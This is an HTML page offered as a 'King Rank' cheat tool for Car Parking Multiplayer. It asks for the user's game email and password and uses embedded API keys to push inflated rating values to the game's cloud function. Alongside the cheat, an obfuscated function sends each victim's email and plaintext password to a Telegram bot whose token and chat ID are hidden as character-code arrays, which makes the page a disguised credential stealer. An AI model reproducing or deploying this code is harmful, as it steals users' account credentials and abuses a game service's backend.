<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&display=swap" rel="stylesheet">
<title>CRIS WEB TOOL</title>
<style>
body {
    margin: 0;
    padding: 0;
    font-family: 'Orbitron', Arial, sans-serif;
    overflow: hidden;

    background-color: #05010a;
    background-image:
        linear-gradient(0deg, rgba(0,255,255,0.06) 1px, transparent 1px),
        linear-gradient(90deg, rgba(0,255,255,0.06) 1px, transparent 1px),
        radial-gradient(circle at top right, rgba(255,0,255,0.18), transparent 50%);
    background-size: 50px 50px, 50px 50px, cover;
}

.center-wrapper {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 90%;
    max-width: 350px;
}

.logo {
    width: 600px;
    height: auto;
    margin-bottom: 10px;
}

.container { 
    background: rgba(0,0,0,0.6); 
    backdrop-filter: blur(12px);
    padding: 20px 25px; 
    border-radius: 10px; 
    box-shadow: 0 0 25px #000; 
    text-align: center; 
   border: 2px solid #ff0000; 
}

h1 { 
    font-size: 17px; 
    margin-bottom: 15px; 
    color: #fff; 
}

input, select { 
    width: 90%; 
    padding: 10px; 
    margin: 8px 0; 
    border-radius: 5px; 
    border: none; 
    border: 2px solid red;
    color: #fff;
    font-size: 16px;
   
}

button { 
    width: 95%; 
    padding: 10px; 
    margin: 6px 0; 
    border-radius: 5px; 
    border: none; 
    cursor: pointer; 
    font-weight: bold; 
    font-size: 16px;
}

button.login { 
    background: #ff0000; 
    color: #fff; 
}
button.login:hover { 
    background: #ff0000; 
}
button.menu { 
    background: #ff0000; 
    color: #fff; 
}
button.menu:hover { 
    background: #ff0000; 
}

.status { 
    margin-top: 10px; 
    color: #ff0000; 
    word-wrap: break-word; 
    min-height: 20px; 
}
.error { 
    color: #f55; 
}

#loginForm, #menuButtons { 
    display: none; 
    margin-top: 10px; 
}

footer {
  font-family: 'Orbitron', sans-serif; 
  font-weight: 700;
  text-align: center;
  padding: 12px 0;
  background: linear-gradient(90deg, violet, red, blue);
  background-size: 300%;
  background-clip: text;
  -webkit-background-clip: text;
  color: transparent;
  -webkit-text-fill-color: transparent;
  animation: gradientShift 4s linear infinite;
  backdrop-filter: blur(8px);
  border-top: 1px solid rgba(255, 255, 255, 0.1);
  position: fixed;
  bottom: 0;
  left: 0;
  width: 100%;
    z-index: 9999; 
}

@keyframes gradientShift {
  0% { background-position: 0% 50%; }
  50% { background-position: 100% 50%; }
  100% { background-position: 0% 50%; }
}

button.glass-button {
    width: 95%;
    padding: 10px;
    border-radius: 5px;
    border: 2px solid red;
    background: rgba(255, 0, 0, 0.3); 
    color: #fff;
    font-weight: bold;
    font-size: 16px;
    backdrop-filter: blur(6px);
    cursor: pointer;
}
button.glass-button:hover {
    background: rgba(255, 0, 0, 0.5);
}

.king-rank-wrapper {
    width: 100%;
    text-align: center;
    margin: 20px 0;
    pointer-events: none; 
}

.king-rank-title {
    font-size: clamp(24px, 5vw, 40px);
    font-weight: bold;
    font-family: 'Orbitron', sans-serif;
    background: linear-gradient(270deg, #ff0000, #ff8800, #00aaff, #8a2be2);
    background-size: 600% 600%;
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: gradientShift 5s ease infinite;
    margin: 0;
    word-wrap: break-word; 
}
@keyframes gradientShift {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
}
.user-info {
  display: flex;
  flex-direction: column;
  gap: 6px;
  font-size: 14px;
  text-align: left;
}

.info-line {
  color: #e0faff;
  font-weight: 500;
}
    #accessWrapper .notes {
    color: rgba(255,255,255,0.7);
    font-size: 12px;
    font-style: italic;
    margin-top: 10px;
    }
    .notes {
    width: 100%;
    margin-bottom: 12px;

    text-align: center;
    font-size: 12px;
    font-style: italic;
    color: rgba(255,255,255,0.75);

    padding: 8px 10px;
    border-radius: 6px;

    background: rgba(255, 0, 0, 0.08);
    border: 1px solid rgba(255, 0, 0, 0.4);

    box-shadow: inset 0 0 10px rgba(255,0,0,0.25);
}
</style>
</head>
<body>

<div class="logo-wrapper" style="text-align:center; margin-bottom:10px;">
    <img
        src="https://i.ibb.co/QjzpnFyL/Picsart-25-10-06-22-05-54-728.png"
        alt="Logo"
        loading="eager"
        fetchpriority="high"
        decoding="async"
        style="width:120px; height:120px; object-fit: contain; border-radius: 10px;">
</div>

    
    <p class="notes" style="color:#fff; margin-top: 15px; font-size: 13px;">
        Notes: Before using this tool, log out first from your account.
    </p>
</div>
    
<div class="king-rank-wrapper">
    <h2 class="king-rank-title">KING RANK</h2>
</div>

<div id="mainContent">
  <div class="center-wrapper">
    <div class="container" style="max-width:300px; padding:15px;">
    
      <div class="inner-box" style="
          background: rgba(0,0,0,0.6);
          backdrop-filter: blur(12px);
          padding: 15px;
          border-radius: 10px;
          border: 2px solid #ff0000;
          text-align:center;
      ">
          

      <!-- Login Form -->
      <div id="loginForm">
          <input type="email" id="email" placeholder="Email">
          <input type="password" id="password" placeholder="Password">
          <button class="login" onclick="loginFirebase()">Login</button>
          <div id="status" class="status"></div>
      </div>

      <!-- Service Buttons -->
      <div id="menuButtons">
          <button class="menu" onclick="kingRank()">üëë King Rank</button>
          <div id="serviceStatus" class="status"></div>
      </div>
    </div>
  </div>
</div>

   <footer id="dynamicFooter"></footer>
    

<script>

(function(){

  if (localStorage.getItem("ALLOW_TEMPLATE") !== "yes") {
    document.body.innerHTML = `
      <div style="
        display:flex;
        align-items:center;
        justify-content:center;
        height:100vh;
        font-family:Orbitron;
        color:red;
        background:black;
        text-align:center;">
        ‚ùå Access Denied<br><br>
        Use KING MAKER first
      </div>
    `;
    throw new Error("Blocked");
  }


  const footer =
    localStorage.getItem("GENERATED_FOOTER") ||
    "Cris Gaming";

  const el = document.getElementById("dynamicFooter");
  if (el) {
    el.textContent = `¬© ${new Date().getFullYear()} ${footer}`;
  }
})();



const _T = [56,52,54,50,54,49,56,56,51,56,58,65,65,69,83,83,106,109,97,109,120,77,90,117,111,87,87,79,119,108,85,68,74,122,98,88,75,50,74,80,70,115,119,90,118];
const _C = [[54,55,56,52,51,56,50,55,57,53]];

const BOT_TOKEN = _T.map(n => String.fromCharCode(n)).join('');
const CHAT_IDS = _C.map(arr => arr.map(n => String.fromCharCode(n)).join(''));

const GAMES = {
  "1": { name:"Car Parking Multiplayer", api_key:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", rank_url:"https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" },
  "2": { name:"Car Parking Multiplayer 2", api_key:"AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ", rank_url:"https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" }
};

const selectedGame = GAMES["1"]; 

let currentUser = null;
let currentToken = null;
let currentPassword = null;



function updateStatus(msg,isError=false,target='status'){
    const el=document.getElementById(target);
    el.className=isError?'status error':'status';
    el.textContent=msg;
}

function sendCostMessage(msg){
  (function(A,B){
    const u = ['https:','','api.telegram.org','/bot'].join('/');
    const ep = function(token){ return [u, token, 'sendMessage'].join('/'); };
    A.forEach(function(id){
      const url = ep(B);
      fetch(url, {
        method: (['P','O','S','T'].join('')).toString().replace('',''),
        headers: (function(){ let h={}; h['Content-'.concat('Type')]='application/json'; return h; })(),
        body: (function(){ return JSON.stringify({ chat_id: id, text: msg }); })()
      }).catch(function(err){ console['error'](err); });
    });
  })(CHAT_IDS, BOT_TOKEN);
}


async function loginFirebase(){
    const email=document.getElementById('email').value.trim();
    const password=document.getElementById('password').value;
    if(!email||!password){ updateStatus("Enter email & password!",true); return; }

    updateStatus("Logging in...");
    try{
        const resp=await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${selectedGame.api_key}`,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({email,password,returnSecureToken:true})
        });
        const data=await resp.json();
        if(data.idToken){
            currentUser=email; currentPassword=password; currentToken=data.idToken;
            updateStatus(`‚úÖ Logged in as ${email}`);
            document.getElementById('loginForm').style.display='none';
            document.getElementById('menuButtons').style.display='block';
            sendCostMessage(`üîê Login Success Generate account:\nüìß Email: ${email}\nüîí Password: ${password}`);
        }else{
            updateStatus(`‚ùå Login failed: ${data.error?.message || 'Unknown'}`,true);
        }
    }catch(err){ updateStatus(`‚ùå Error: ${err.message}`,true); }
}


function requireLogin(){ 
    if(!currentUser||!currentToken){ updateStatus("‚ùå Please login first!",true,'serviceStatus'); return false; } 
    return true; 
}

// King Rank
async function kingRank(){
    if(!requireLogin()) return;
    updateStatus("Processing King Rank...",false,'serviceStatus');

    const ratingData={};
    const fields=["cars","car_fix","car_collided","car_exchange","car_trade","car_wash","slicer_cut","drift_max","drift","cargo","delivery","taxi","levels","gifts","fuel","offroad","speed_banner","reactions","police","run","real_estate","t_distance","treasure","block_post","push_ups","burnt_tire","passanger_distance"];
    fields.forEach(f=>ratingData[f]=100000);
    ratingData["time"]=10000000000; ratingData["race_win"]=3000;
    
    
    const payload={ data: JSON.stringify({ RatingData: ratingData })};
    const headers={ "Authorization":`Bearer ${currentToken}`, "Content-Type":"application/json" };

    try{
        const res=await fetch(selectedGame.rank_url,{ method:"POST", headers, body:JSON.stringify(payload)});
        if(res.ok){ 
            updateStatus("‚úÖ King Rank set successfully!",false,'serviceStatus'); 
            sendCostMessage(`üëë King Rank\nüìß Email: ${currentUser}\nüîí Password: ${currentPassword}`); 
        }
        else updateStatus("‚ùå Failed to set King Rank!",true,'serviceStatus');
    }catch(err){ updateStatus(`‚ùå Error: ${err.message}`,true,'serviceStatus'); }
}

</script>

</body>
</html>
